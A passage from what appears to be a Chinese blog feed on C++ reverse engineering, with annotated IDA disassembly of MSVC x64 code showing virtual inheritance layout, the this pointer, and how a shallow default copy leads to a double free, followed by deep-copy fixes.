取出对象中Sofa类虚基类偏移表第二项，虚基类对象首地址相对于虚基类偏移表的偏移值。</span><br><span class="line">.text:000000014000358D lea     rax, [rsp+rax+0A8h+SofaBed.baseclass_0.gap8] ; 找到虚基类</span><br><span class="line">.text:0000000140003592 mov     [rsp+0A8h+var_80], rax</span><br><span class="line">.text:0000000140003592</span><br><span class="line">.text:0000000140003597</span><br><span class="line">.text:0000000140003597 loc_140003597:                          ; CODE XREF: main+32↑j</span><br><span class="line">.text:0000000140003597 mov     rax, [rsp+0A8h+var_80]</span><br><span class="line">.text:000000014000359C mov     [rsp+0A8h+var_60], rax          ; Furniture* p1 = &amp;sofabed;   //转换成虚基类指针</span><br><span class="line">.text:00000001400035A1 lea     rax, [rsp+0A8h+SofaBed]</span><br><span class="line">.text:00000001400035A6 mov     [rsp+0A8h+var_68], rax          ; Sofa* p2 = &amp;sofabed;        //转换成父类指针</span><br><span class="line">.text:00000001400035AB lea     rax, [rsp+0A8h+SofaBed]</span><br><span class="line">.text:00000001400035B0 test    rax, rax</span><br><span class="line">.text:00000001400035B3 jz      short loc_1400035C5</span><br><span class="line">.text:00000001400035B3</span><br><span class="line">.text:00000001400035B5 lea     rax, [rsp+0A8h+SofaBed]</span><br><span class="line">.text:00000001400035BA add     rax, 18h                        ; 直接加偏移获取到Bed首地址</span><br><span class="line">.text:00000001400035BE mov     [rsp+0A8h+var_78], rax</span><br><span class="line">.text:00000001400035C3 jmp     short loc_1400035CE</span><br><span class="line">.text:00000001400035C3</span><br><span class="line">.text:00000001400035C5 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000001400035C5</span><br><span class="line">.text:00000001400035C5 loc_1400035C5:                          ; CODE XREF: main+63↑j</span><br><span class="line">.text:00000001400035C5 mov     [rsp+0A8h+var_78], 0</span><br><span class="line">.text:00000001400035C5</span><br><span class="line">.text:00000001400035CE</span><br><span class="line">.text:00000001400035CE loc_1400035CE:                          ; CODE XREF: main+73↑j</span><br><span class="line">.text:00000001400035CE mov     rax, [rsp+0A8h+var_78]</span><br><span class="line">.text:00000001400035D3 mov     [rsp+0A8h+var_70], rax          ; Bed* p3 = &amp;sofabed;         //转换成父类指针</span><br><span class="line">.text:00000001400035D8 mov     r9, [rsp+0A8h+var_70]</span><br><span class="line">.text:00000001400035DD mov     r8, [rsp+0A8h+var_68]</span><br><span class="line">.text:00000001400035E2 mov     rdx, [rsp+0A8h+var_60]</span><br><span class="line">.text:00000001400035E7 lea     rcx, aPPP                       ; &quot;%p %p %p\n&quot;</span><br><span class="line">.text:00000001400035EE call    j_printf</span><br><span class="line">.text:00000001400035EE</span><br><span class="line">.text:00000001400035F3 mov     [rsp+0A8h+var_88], 0</span><br><span class="line">.text:00000001400035FB lea     rcx, [rsp+0A8h+SofaBed]         ; this</span><br><span class="line">.text:0000000140003600 call    j_??_DSofaBed@@QEAAXXZ          ; SofaBed::`vbase destructor&#x27;(void)</span><br><span class="line">.text:0000000140003600</span><br><span class="line">.text:0000000140003605 mov     eax, [rsp+0A8h+var_88]</span><br><span class="line">.text:0000000140003609 add     rsp, 0A8h</span><br><span class="line">.text:0000000140003610 retn</span><br></pre></td></tr></table></figure><p>Sofa虚基类偏移表存储两个值-8 和 0x30</p><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026125459339.png" alt="image-20231026125459339"></p><ul><li>第一项为-8，即虚基类偏移表所属类对应的对象首地址相对于虚基类偏移表的偏移值；</li><li>第二项保存的是虚基类对象首地址相对于虚基类偏移表的偏移值。</li></ul><p>虚基类放到了一个公共的位置，羊和驼类里原本存放动物的位置现在存放虚基偏移表指针，利用偏移来寻址虚基类</p><p>多个虚基类时，会在虚基类偏移表中依次记录它们的偏移量。</p><h3 id="虚继承子类构造函数"><a href="#虚继承子类构造函数" class="headerlink" title="虚继承子类构造函数"></a>虚继承子类构造函数</h3><p><strong>虚继承子类构造函数传入了参数1:this指针，参数2:构造虚基类的标志：1构造，0不构造,防止重复构造虚基类</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001860 ; void __fastcall SofaBed::SofaBed(SofaBed *this)</span><br><span class="line">.text:0000000140001860 ??0SofaBed@@QEAA@XZ proc near           ; CODE XREF: SofaBed::SofaBed(void)↑j</span><br><span class="line">.text:0000000140001860                                         ; DATA XREF: .pdata:000000014000B048↓o</span><br><span class="line">.text:0000000140001860</span><br><span class="line">.text:0000000140001860 var_18= dword ptr -18h</span><br><span class="line">.text:0000000140001860 sofabed_this= qword ptr  8</span><br><span class="line">.text:0000000140001860 flag= dword ptr  10h</span><br><span class="line">.text:0000000140001860</span><br><span class="line">.text:0000000140001860 ; FUNCTION CHUNK AT .text:00000001400057E0 SIZE 0000002A BYTES</span><br><span class="line">.text:0000000140001860 ; FUNCTION CHUNK AT .text:0000000140005810 SIZE 0000001C BYTES</span><br><span class="line">.text:0000000140001860</span><br><span class="line">.text:0000000140001860 ; __unwind &#123; // __CxxFrameHandler4_0</span><br><span class="line">.text:0000000140001860 mov     [rsp+flag], edx</span><br><span class="line">.text:0000000140001864 mov     [rsp+sofabed_this], rcx</span><br><span class="line">.text:0000000140001869 sub     rsp, 38h</span><br><span class="line">.text:000000014000186D mov     [rsp+38h+var_18], 0</span><br><span class="line">.text:0000000140001875 cmp     [rsp+38h+flag], 0</span><br><span class="line">.text:000000014000187A jz      short loc_1400018B9             ; 为0不构造虚基类，防止重复构造虚基类</span><br><span class="line">.text:000000014000187A</span><br><span class="line">.text:000000014000187C mov     rax, [rsp+38h+sofabed_this]     ; rax=this指针</span><br><span class="line">.text:0000000140001881 lea     rcx, ??_8SofaBed@@7BSofa@@@     ; const SofaBed::`vbtable&#x27;&#123;for `Sofa&#x27;&#125;</span><br><span class="line">.text:0000000140001888 mov     [rax+8], rcx                    ; 设置父类Sofa中的虚基类偏移表</span><br><span class="line">.text:000000014000188C mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:0000000140001891 lea     rcx, ??_7SofaBed@@6BFurniture@@@+10h ; const SofaBed::`vftable&#x27;&#123;for `Furniture&#x27;&#125;</span><br><span class="line">.text:0000000140001898 mov     [rax+20h], rcx                  ; 设置父类Bed中的虚基类偏移</span><br><span class="line">.text:000000014000189C mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:00000001400018A1 add     rax, 38h ; &#x27;8&#x27;                  ; 调整this指针为虚基类this指针</span><br><span class="line">.text:00000001400018A5 mov     rcx, rax                        ; this</span><br><span class="line">.text:00000001400018A8 call    j_??0Furniture@@QEAA@XZ         ; Furniture::Furniture(void)</span><br><span class="line">.text:00000001400018A8</span><br><span class="line">.text:00000001400018AD nop</span><br><span class="line">.text:00000001400018AE mov     eax, [rsp+38h+var_18]           ; eax=0</span><br><span class="line">.text:00000001400018B2 or      eax, 1                          ; eax=1</span><br><span class="line">.text:00000001400018B5 mov     [rsp+38h+var_18], eax</span><br><span class="line">.text:00000001400018B5</span><br><span class="line">.text:00000001400018B9</span><br><span class="line">.text:00000001400018B9 loc_1400018B9:                          ; CODE XREF: SofaBed::SofaBed(void)+1A↑j</span><br><span class="line">.text:00000001400018B9 xor     edx, edx                        ; 给Sofa传入0,不再构造虚基类，上面已经构造过了</span><br><span class="line">.text:00000001400018BB mov     rcx, [rsp+38h+sofabed_this]     ; this</span><br><span class="line">.text:00000001400018BB</span><br><span class="line">.text:00000001400018C0</span><br><span class="line">.text:00000001400018C0 loc_1400018C0:                          ; CODE XREF: .text:00000001400010DC↑j</span><br><span class="line">.text:00000001400018C0 call    j_??0Sofa@@QEAA@XZ              ; Sofa::Sofa(void)</span><br><span class="line">.text:00000001400018C0</span><br><span class="line">.text:00000001400018C5 nop</span><br><span class="line">.text:00000001400018C6 ;   try &#123;</span><br><span class="line">.text:00000001400018C6 mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:00000001400018CB add     rax, 18h</span><br><span class="line">.text:00000001400018CF xor     edx, edx</span><br><span class="line">.text:00000001400018D1 mov     rcx, rax                        ; this</span><br><span class="line">.text:00000001400018D4 call    j_??0Bed@@QEAA@XZ               ; Bed::Bed(void)</span><br><span class="line">.text:00000001400018D4</span><br><span class="line">.text:00000001400018D9 mov     rax, [rsp+38h+sofabed_this]     ; 下面就是设置各个类的虚表指针</span><br><span class="line">.text:00000001400018DE lea     rcx, ??_7SofaBed@@6BSofa@@@     ; const SofaBed::`vftable&#x27;&#123;for `Sofa&#x27;&#125;</span><br><span class="line">.text:00000001400018E5 mov     [rax], rcx</span><br><span class="line">.text:00000001400018E8 mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:00000001400018ED lea     rcx, ??_7SofaBed@@6BBed@@@      ; const SofaBed::`vftable&#x27;&#123;for `Bed&#x27;&#125;</span><br><span class="line">.text:00000001400018F4 mov     [rax+18h], rcx</span><br><span class="line">.text:00000001400018F8 mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:00000001400018FD mov     rax, [rax+8]</span><br><span class="line">.text:0000000140001901 movsxd  rax, dword ptr [rax+4]</span><br><span class="line">.text:0000000140001905 mov     rcx, [rsp+38h+sofabed_this]</span><br><span class="line">.text:000000014000190A lea     rdx, ??_7SofaBed@@6BFurniture@@@ ; const SofaBed::`vftable&#x27;&#123;for `Furniture&#x27;&#125;</span><br><span class="line">.text:0000000140001911 mov     [rcx+rax+8], rdx</span><br><span class="line">.text:0000000140001916 lea     rcx, aSofabedSofabed            ; &quot;SofaBed::SofaBed()\n&quot;</span><br><span class="line">.text:000000014000191D call    j_printf</span><br><span class="line">.text:000000014000191D</span><br><span class="line">.text:0000000140001922 mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:0000000140001927 mov     dword ptr [rax+30h], 6</span><br><span class="line">.text:0000000140001927 ;   &#125; // starts at 1400018C6</span><br><span class="line">.text:000000014000192E mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:0000000140001933 add     rsp, 38h</span><br><span class="line">.text:0000000140001937 retn</span><br></pre></td></tr></table></figure><h3 id="虚继承子类代理析构函数"><a href="#虚继承子类代理析构函数" class="headerlink" title="虚继承子类代理析构函数"></a>虚继承子类代理析构函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000001400019F</span>0 ; <span class="type">void</span> __fastcall SofaBed::`vbase destructor<span class="number">&#x27;</span>(SofaBed *this)</span><br><span class="line">.text:<span class="number">00000001400019F</span>0 ??_DSofaBed@@QEAAXXZ proc near          ; CODE XREF: SofaBed::`vbase destructor<span class="number">&#x27;</span>(<span class="type">void</span>)↑j</span><br><span class="line">.text:<span class="number">00000001400019F</span>0                                         ; DATA XREF: .pdata:<span class="number">000000014000B</span>060↓o</span><br><span class="line">.text:<span class="number">00000001400019F</span>0                                         ; .pdata:<span class="number">000000014000B</span>06C↓o</span><br><span class="line">.text:<span class="number">00000001400019F</span>0</span><br><span class="line">.text:<span class="number">00000001400019F</span>0 sofabed_this= qword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000001400019F</span>0</span><br><span class="line">.text:<span class="number">00000001400019F</span>0 mov     [rsp+sofabed_this], rcx</span><br><span class="line">.text:<span class="number">00000001400019F</span>5 sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000001400019F</span>9 mov     rax, [rsp+<span class="number">28</span>h+sofabed_this]</span><br><span class="line">.text:<span class="number">00000001400019F</span>E add     rax, <span class="number">38</span>h ; <span class="string">&#x27;8&#x27;</span></span><br><span class="line">.text:<span class="number">0000000140001</span>A02 mov     rcx, rax                        ; this</span><br><span class="line">.text:<span class="number">0000000140001</span>A05 call    j_??<span class="number">1</span>SofaBed@@UEAA@XZ           ; SofaBed::~SofaBed(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">0000000140001</span>A05</span><br><span class="line">.text:<span class="number">0000000140001</span>A0A mov     rax, [rsp+<span class="number">28</span>h+sofabed_this]</span><br><span class="line">.text:<span class="number">0000000140001</span>A0F add     rax, <span class="number">38</span>h ; <span class="string">&#x27;8&#x27;</span></span><br><span class="line">.text:<span class="number">0000000140001</span>A13 mov     rcx, rax                        ; this</span><br><span class="line">.text:<span class="number">0000000140001</span>A16 call    j_??<span class="number">1F</span>urniture@@UEAA@XZ         ; Furniture::~Furniture(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">0000000140001</span>A16</span><br><span class="line">.text:<span class="number">0000000140001</span>A1B add     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000140001</span>A1F retn</span><br></pre></td></tr></table></figure><p>先依次执行两个父类Bed和Sofa的析构函数，然后执行虚基类的析构函数</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><strong>C++反汇编与逆向分析技术揭秘</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++反汇编 0x00</title>
      <link href="/2023/10/24/Cpp-disassemble/"/>
      <url>/2023/10/24/Cpp-disassemble/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>不做特殊说明均为vs2022 x64 release版本 关闭优化，固定基址，关闭canary</p><p><img src="/2023/10/24/Cpp-disassemble/image-20231025163548674.png" alt="image-20231025163548674"></p><h2 id="类特性"><a href="#类特性" class="headerlink" title="类特性"></a>类特性</h2><p>没有数据成员的类是占一个字节的，为了实例化后可以调用函数成员</p><p>类的静态数据成员与局部静态变量类似，存放的位置和全局变量一致。只是编译器增加了作用域的检查，在作用域之外不可见。</p><h2 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h2><p>this指针中保存了所属对象的首地址,需要访问类数据成员时通过rcx传递this指针，默认调用约定称为thiscall</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  <span class="type">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;        <span class="comment">//公有成员函数</span></span><br><span class="line">    this-&gt;age = age;</span><br><span class="line">  &#125;</span><br><span class="line">public:</span><br><span class="line">  <span class="type">int</span> age;                <span class="comment">//公有数据成员</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person person;</span><br><span class="line">  person.setAge(<span class="number">5</span>);            <span class="comment">//调用成员函数</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Person : %d\n&quot;</span>, person.age);    <span class="comment">//获取数据成员</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001450 ; int __fastcall main(int argc, char **argv)</span><br><span class="line">.text:0000000140001450 main proc near                          ; CODE XREF: main_0↑j</span><br><span class="line">.text:0000000140001450                                         ; DATA XREF: .pdata:000000014000900C↓o</span><br><span class="line">.text:0000000140001450</span><br><span class="line">.text:0000000140001450 var_18= Person ptr -18h</span><br><span class="line">.text:0000000140001450 arg_0= dword ptr  8</span><br><span class="line">.text:0000000140001450 arg_8= qword ptr  10h</span><br><span class="line">.text:0000000140001450</span><br><span class="line">.text:0000000140001450 mov     [rsp+arg_8], rdx</span><br><span class="line">.text:0000000140001455 mov     [rsp+arg_0], ecx                ; 保护参数</span><br><span class="line">.text:0000000140001459 sub     rsp, 38h</span><br><span class="line">.text:000000014000145D mov     edx, 5                          ; 参数为5</span><br><span class="line">.text:0000000140001462 lea     rcx, [rsp+38h+var_18]           ; this指针指向person的首地址</span><br><span class="line">.text:0000000140001467 call    j_?setAge@Person@@QEAAXH@Z      ; Person::setAge(int)</span><br><span class="line">.text:0000000140001467</span><br><span class="line">.text:000000014000146C mov     edx, [rsp+38h+var_18.age]</span><br><span class="line">.text:0000000140001470 lea     rcx, _Format                    ; &quot;Person : %d\n&quot;</span><br><span class="line">.text:0000000140001477 call    j_printf</span><br><span class="line">.text:0000000140001477</span><br><span class="line">.text:000000014000147C xor     eax, eax</span><br><span class="line">.text:000000014000147E add     rsp, 38h</span><br><span class="line">.text:0000000140001482 retn</span><br><span class="line">.text:0000000140001482</span><br><span class="line">.text:0000000140001482 main endp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000001400013C0 ; void __fastcall Person::setAge(Person *this, int age)</span><br><span class="line">.text:00000001400013C0 ?setAge@Person@@QEAAXH@Z proc near      ; CODE XREF: Person::setAge(int)↑j</span><br><span class="line">.text:00000001400013C0</span><br><span class="line">.text:00000001400013C0 arg_0= qword ptr  8</span><br><span class="line">.text:00000001400013C0 arg_8= dword ptr  10h</span><br><span class="line">.text:00000001400013C0</span><br><span class="line">.text:00000001400013C0 mov     [rsp+arg_8], edx                   ;参数：5</span><br><span class="line">.text:00000001400013C4 mov     [rsp+arg_0], rcx                ; this指针指向person首地址</span><br><span class="line">.text:00000001400013C9 mov     rax, [rsp+arg_0]                ; rax=this指针</span><br><span class="line">.text:00000001400013CE mov     ecx, [rsp+arg_8]                ; rcx=5</span><br><span class="line">.text:00000001400013D2 mov     [rax], ecx                      ; this-&gt;age=5</span><br><span class="line">.text:00000001400013D4 retn</span><br></pre></td></tr></table></figure><h2 id="对象作为函数参数"><a href="#对象作为函数参数" class="headerlink" title="对象作为函数参数"></a>对象作为函数参数</h2><p>进入函数前预先保留对象使用的栈空间，类中没有定义拷贝构造函数，编译器会对原对象与临时对象中的各数据成员直接进行数据复制，形成一个临时对象，称为默认复制构造函数，这种复制方式属于浅拷贝，如果类带有指针变量，并有动态内存分配，它必须有一个拷贝构造函数否则会有问题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;</span><br><span class="line">    name = new <span class="type">char</span>[<span class="number">32</span>];  <span class="comment">//申请堆空间，只要不释放，进程退出前将一直存在</span></span><br><span class="line">    age = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">if</span> (name != <span class="literal">NULL</span>) &#123;   <span class="comment">//堆空间申请成功与否</span></span><br><span class="line">      <span class="built_in">strcpy</span>(name, <span class="string">&quot;tom&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ~Person() &#123;</span><br><span class="line">    <span class="keyword">if</span> (name != <span class="literal">NULL</span>) &#123;  <span class="comment">//检查资源</span></span><br><span class="line">      delete[] name;     <span class="comment">//释放堆空间</span></span><br><span class="line">      name = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> name;        <span class="comment">//获取数据成员</span></span><br><span class="line">  &#125;</span><br><span class="line">private:</span><br><span class="line">  <span class="type">char</span>* name;          <span class="comment">//数据成员定义，保存堆的首地址</span></span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//参数为Person类对象的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(Person obj)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(obj.getName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person person;  <span class="comment">//类对象定义</span></span><br><span class="line">  show(person);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140001650</span> var_48= dword ptr <span class="number">-48</span>h</span><br><span class="line">.text:<span class="number">0000000140001650</span> var_40= Person ptr <span class="number">-40</span>h</span><br><span class="line">.text:<span class="number">0000000140001650</span> obj= Person ptr <span class="number">-28</span>h</span><br><span class="line">.text:<span class="number">0000000140001650</span> arg_0= dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000140001650</span> arg_8= qword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0000000140001650</span></span><br><span class="line">.text:<span class="number">0000000140001650</span> ; FUNCTION CHUNK AT .text:<span class="number">0000000140005260</span> SIZE <span class="number">00000018</span> BYTES</span><br><span class="line">.text:<span class="number">0000000140001650</span></span><br><span class="line">.text:<span class="number">0000000140001650</span> ; __unwind &#123; <span class="comment">// __CxxFrameHandler4_0</span></span><br><span class="line">.text:<span class="number">0000000140001650</span> mov     [rsp+arg_8], rdx</span><br><span class="line">.text:<span class="number">0000000140001655</span> mov     [rsp+arg_0], ecx</span><br><span class="line">.text:<span class="number">0000000140001659</span> push    rsi</span><br><span class="line">.text:<span class="number">000000014000165</span>A push    rdi</span><br><span class="line">.text:<span class="number">000000014000165B</span> sub     rsp, <span class="number">58</span>h</span><br><span class="line">.text:<span class="number">000000014000165F</span> lea     rcx, [rsp+<span class="number">68</span>h+var_40]           ; this</span><br><span class="line">.text:<span class="number">0000000140001664</span> call    j_??<span class="number">0</span>Person@@QEAA@XZ            ; Person::Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">0000000140001664</span></span><br><span class="line">.text:<span class="number">0000000140001669</span> nop</span><br><span class="line">.text:<span class="number">000000014000166</span>A lea     rax, [rsp+<span class="number">68</span>h+obj]</span><br><span class="line">.text:<span class="number">000000014000166F</span> lea     rcx, [rsp+<span class="number">68</span>h+var_40]</span><br><span class="line">.text:<span class="number">0000000140001674</span> mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000140001677</span> mov     rsi, rcx</span><br><span class="line">.text:<span class="number">000000014000167</span>A mov     ecx, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">000000014000167F</span> rep movsb                               ; 采用默认拷贝构造函数在rsp+<span class="number">68</span>+obj浅拷贝生成person复制品作为参数</span><br><span class="line">.text:<span class="number">0000000140001681</span> lea     rcx, [rsp+<span class="number">68</span>h+obj]              ; obj</span><br><span class="line">.text:<span class="number">0000000140001686</span> call    j_?show@@YAXVPerson@@@Z         ; show(Person)</span><br><span class="line">.text:<span class="number">0000000140001686</span></span><br><span class="line">.text:<span class="number">000000014000168B</span> mov     [rsp+<span class="number">68</span>h+var_48], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000140001693</span> lea     rcx, [rsp+<span class="number">68</span>h+var_40]           ; this</span><br><span class="line">.text:<span class="number">0000000140001698</span> call    j_??<span class="number">1</span>Person@@QEAA@XZ            ; Person::~Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">0000000140001698</span></span><br><span class="line">.text:<span class="number">000000014000169</span>D mov     eax, [rsp+<span class="number">68</span>h+var_48]</span><br><span class="line">.text:<span class="number">00000001400016</span>A1 add     rsp, <span class="number">58</span>h</span><br><span class="line">.text:<span class="number">00000001400016</span>A5 pop     rdi</span><br><span class="line">.text:<span class="number">00000001400016</span>A6 pop     rsi</span><br><span class="line">.text:<span class="number">00000001400016</span>A7 retn</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000001400015B</span>0 ; <span class="type">void</span> __fastcall <span class="title function_">show</span><span class="params">(Person obj)</span></span><br><span class="line">.text:00000001400015B0 ?show@@YAXVPerson@@@Z proc near         ; CODE XREF: show(Person)↑j</span><br><span class="line">.text:<span class="number">00000001400015B</span>0                                         ; DATA XREF: .pdata:<span class="number">000000014000B</span>018↓o</span><br><span class="line">.text:<span class="number">00000001400015B</span>0</span><br><span class="line">.text:<span class="number">00000001400015B</span>0 arg_0= qword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000001400015B</span>0</span><br><span class="line">.text:<span class="number">00000001400015B</span>0 ; FUNCTION CHUNK AT .text:<span class="number">0000000140005240</span> SIZE <span class="number">00000018</span> BYTES</span><br><span class="line">.text:<span class="number">00000001400015B</span>0</span><br><span class="line">.text:<span class="number">00000001400015B</span>0 ; __unwind &#123; <span class="comment">// __CxxFrameHandler4_0</span></span><br><span class="line">.text:<span class="number">00000001400015B</span>0 mov     [rsp+arg_0], rcx                ;临时对象地址</span><br><span class="line">.text:<span class="number">00000001400015B</span>5 sub     rsp, <span class="number">28</span>h                        </span><br><span class="line">.text:<span class="number">00000001400015B</span>9 mov     rcx, [rsp+<span class="number">28</span>h+arg_0]            ; 临时对象地址 this</span><br><span class="line">.text:<span class="number">00000001400015B</span>E call    j_?getName@Person@@QEAAPEBDXZ   ; Person::getName(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000001400015B</span>E</span><br><span class="line">.text:<span class="number">00000001400015</span>C3 mov     rcx, rax                        ; _Format</span><br><span class="line">.text:<span class="number">00000001400015</span>C6 call    j_printf</span><br><span class="line">.text:<span class="number">00000001400015</span>C6</span><br><span class="line">.text:<span class="number">00000001400015</span>CB nop</span><br><span class="line">.text:<span class="number">00000001400015</span>CC mov     rcx, [rsp+<span class="number">28</span>h+arg_0]            ; this</span><br><span class="line">.text:<span class="number">00000001400015</span>D1 call    j_??<span class="number">1</span>Person@@QEAA@XZ            ; Person::~Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000001400015</span>D1</span><br><span class="line">.text:<span class="number">00000001400015</span>D6 add     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000001400015</span>DA retn</span><br></pre></td></tr></table></figure><p>采用了浅拷贝将同一个堆地址赋值给name，show里调用了析构释放了堆，main里的也析构造成double free crash</p><p><strong>第一种解决方法</strong></p><p>设置引用计数,在进入复制构造函数时，记录类对象被复制引用的次数。当对象被销毁时，检查这个引用计数中保存的引用复制次数是否为0。如果是，则释放申请的资源，否则引用计数减1。</p><p><strong>第二种解决方案</strong></p><p>使用拷贝构造函数深拷贝数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">classname (<span class="type">const</span> classname &amp;obj) &#123;</span><br><span class="line">   <span class="comment">// 拷贝构造函数的主体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Person(<span class="type">const</span> Person &amp;obj) &#123;</span><br><span class="line">    this-&gt;age = obj.age;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(obj.name);</span><br><span class="line">    this-&gt;name = new <span class="type">char</span>[len + <span class="keyword">sizeof</span>(<span class="type">char</span>)];</span><br><span class="line">    <span class="built_in">strcpy</span>(this-&gt;name, obj.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000001400016B</span>0 ; __int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">.text:00000001400016B0 main proc near                          ; CODE XREF: main_0↑j</span><br><span class="line">.text:<span class="number">00000001400016B</span>0                                         ; DATA XREF: .pdata:<span class="number">000000014000B</span>018↓o</span><br><span class="line">.text:<span class="number">00000001400016B</span>0</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 var_48= dword ptr <span class="number">-48</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 var_40= qword ptr <span class="number">-40</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 var_38= Person ptr <span class="number">-38</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 obj= Person ptr <span class="number">-30</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 var_20= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 arg_0= dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000001400016B</span>0 arg_8= qword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 ; FUNCTION CHUNK AT .text:<span class="number">0000000140005260</span> SIZE <span class="number">00000018</span> BYTES</span><br><span class="line">.text:<span class="number">00000001400016B</span>0</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 ; __unwind &#123; <span class="comment">// __CxxFrameHandler4_0</span></span><br><span class="line">.text:<span class="number">00000001400016B</span>0 mov     [rsp+arg_8], rdx</span><br><span class="line">.text:<span class="number">00000001400016B</span>5 mov     [rsp+arg_0], ecx</span><br><span class="line">.text:<span class="number">00000001400016B</span>9 sub     rsp, <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>D lea     rcx, [rsp+<span class="number">68</span>h+obj]              ; this</span><br><span class="line">.text:<span class="number">00000001400016</span>C2 call    j_??<span class="number">0</span>Person@@QEAA@XZ            ; Person::Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000001400016</span>C2</span><br><span class="line">.text:<span class="number">00000001400016</span>C7 nop</span><br><span class="line">.text:<span class="number">00000001400016</span>C8 lea     rax, [rsp+<span class="number">68</span>h+var_20]</span><br><span class="line">.text:<span class="number">00000001400016</span>CD mov     [rsp+<span class="number">68</span>h+var_40], 